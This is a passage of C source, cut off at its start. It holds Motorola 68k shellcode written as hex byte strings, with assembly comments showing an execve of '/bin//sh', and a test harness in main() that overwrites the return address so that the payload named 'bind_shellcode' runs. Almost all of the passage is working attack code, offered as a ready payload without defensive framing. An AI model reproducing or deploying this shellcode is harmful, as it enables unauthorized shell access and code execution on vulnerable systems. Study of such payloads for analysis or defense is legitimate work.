&quot;\x74\x02&quot;           	      /*  moveq #2,%d2          */
&quot;\x4e\x40&quot;           	      /*  trap #0               */
&quot;\x70\x0b&quot;           	      /*  moveq #11,%d0         */ 
&quot;\x48\x79\x2f\x2f\x73\x68&quot;    /*  pea 2f2f7368          */
&quot;\x48\x79\x2f\x62\x69\x6e&quot;    /*  pea 2f62696e          */ 
&quot;\x22\x0f&quot;           	      /*  movel %sp,%d1         */
&quot;\xb5\x82&quot;           	      /*  eorl %d2,%d2          */
&quot;\x2f\x02&quot;           	      /*  movel %d2,%sp@-       */
&quot;\x48\x78\x01\x30&quot;            /*  pea 130               */
&quot;\x24\x0f&quot;           	      /*  movel %sp,%d2         */ 
&quot;\x26\x02&quot;           	      /*  movel %d2,%d3         */ 
&quot;\x4e\x40&quot;;           	      /*  trap #0               */

main()
{
 int *ret;
 ret=(int *)&amp;ret +2;
 *ret = bind_shellcode;
}


